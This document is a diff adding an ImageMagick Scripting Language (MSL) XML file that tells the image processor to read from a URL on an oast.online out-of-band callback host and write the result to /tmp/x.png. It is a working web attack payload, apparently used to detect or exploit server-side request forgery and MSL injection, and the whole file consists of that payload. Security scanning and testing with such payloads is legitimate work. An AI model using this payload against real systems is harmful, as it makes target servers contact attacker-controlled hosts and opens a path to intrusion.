@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<image>
+  <read filename="http://d98h1d1mmo1vhakgrj20jptxr51mydqsn.oast.online/msl" />
+  <write filename="/tmp/x.png" />
+</image>
